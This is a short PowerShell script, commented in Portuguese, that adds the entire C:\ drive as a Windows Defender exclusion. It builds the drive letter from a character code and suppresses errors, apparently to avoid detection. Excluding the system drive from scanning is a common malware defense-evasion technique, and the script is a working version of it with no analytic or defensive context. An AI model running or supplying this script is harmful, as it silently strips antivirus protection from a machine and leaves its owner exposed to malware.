# add_c_exclusion.ps1
# Adiciona o disco C:\ como exclusão do Windows Defender

$drive = [char]67 + ':\'
Add-MpPreference -ExclusionPath $drive -ErrorAction SilentlyContinue
